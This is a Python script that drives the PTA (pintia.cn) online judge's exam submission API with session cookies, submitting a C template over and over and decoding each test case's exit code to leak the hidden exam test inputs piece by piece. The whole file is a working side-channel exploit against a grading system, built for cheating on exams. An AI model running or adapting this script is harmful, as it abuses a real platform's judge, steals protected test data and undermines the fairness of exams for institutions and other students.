import requests
import time

# log file
from loguru import logger
logger.add("10-5-log.log", level="INFO", rotation="10 MB", encoding="utf-8")

NUMBER_ONLY = True
problemSetProblemId = 1987700170000000000
examId = 19881157090000000000
submiturl = f"https://pintia.cn/api/exams/{examId}/exam-submissions"

# Cookies
JSESSIONID = "5ED81E1193E93XXXXXXXXXXX"
PTASession = "885e8ff9-b421-43df-8806-xxxxxxxxxxx"
_bl_uid = "sXmIUetat11dysiFLmgyxXxxXXXxx"

c_code: str | None = None
with open('template.c') as f:
    c_code = f.read()

if not c_code is None:
    c_code = c_code.replace('\\', '\\\\').replace('\n', '\\n').replace('"', '\\"')

payload = "{\"problemType\":\"PROGRAMMING\",\"details\":[{\"problemId\":\"0\",\"problemSetProblemId\":\"" + str(problemSetProblemId) + "\",\"programmingSubmissionDetail\":{\"program\":\"" + c_code + "\",\"compiler\":\"GCC\"}}]}"
headers = {
  'host': 'pintia.cn',
  'Accept': 'application/json;charset=UTF-8',
  'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
  'X-Lollipop': 'e7087fd7444d121e203b589eb9fca753',
  'Content-Type': 'application/json;charset=UTF-8',
  'X-Marshmallow': '',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'Cookie': f'JSESSIONID={JSESSIONID}; PTASession={PTASession}; _bl_uid={_bl_uid}'
}

def parse_number_only_code(code: int) -> str:
    if code == 10:
        return ' '
    elif code == 11:
        return '\n'
    elif code == 12:
        return '\0'
    elif code == 13:
        return '-'
    else:
        return str(code)

test_inputs: dict[str, str] = {}
leak_over_set: set[str] = set()

ch_idx = 0
while True:
    over_flag: bool = True
    use_payload = payload.replace('__LEAK_Pos', str(ch_idx)).replace("__NUMBER_Only", str(1 if NUMBER_ONLY else 0))
    
    response = {}
    while True:
        response = requests.request("POST", submiturl, headers=headers, data=use_payload).json()
        
        if 'submissionId' in response:
            break
        time.sleep(0.5)

    subId = int(response["submissionId"])

    while (True):
        url = f"https://pintia.cn/api/exams/{examId}/submissions/{subId}?"
        response = requests.request("GET", url, headers=headers, data={})
        response = response.json()
        if (len(response["submission"]["judgeResponseContents"]) > 0):
            break
        time.sleep(0.5)

    cases: dict = response["submission"]["judgeResponseContents"][0]["programmingJudgeResponseContent"]["testcaseJudgeResults"]

    print()
    for k, v in cases.items():
        if k not in test_inputs:
            test_inputs[k] = ""
        
        result = v['result']
        exitcode = v['exitcode']

        if NUMBER_ONLY:
            n = [0, 0]
            n[0] = (exitcode & 0xF0) >> 4
            n[1] = exitcode & 0xF
            chs = ''
            for i in n:
                chs += parse_number_only_code(i)
        else:
            chs = chr(exitcode)

        if k not in leak_over_set:
            over_flag = False
            if result == 'WRONG_ANSWER':
                while test_inputs[k][-1] == '\0':
                    test_inputs[k] = test_inputs[k][:-1]

                logger.success(f"Leak Test Case {k} Success!")
                logger.success(f"Test Case {k}:")
                logger.success(test_inputs[k])
                leak_over_set.add(k)
            else:
                test_inputs[k] += chs
                print(f"Test Case {k}: {test_inputs[k]}")  

    print()

    if over_flag:
        break

    if NUMBER_ONLY:
        ch_idx += 2
    else:
        ch_idx += 1

logger.success('All Test Case Leaked!')
logger.success(test_inputs)

for k, v in test_inputs.items():
    print()
    print(f"Test Case {k}: ")
    print(v)
    print()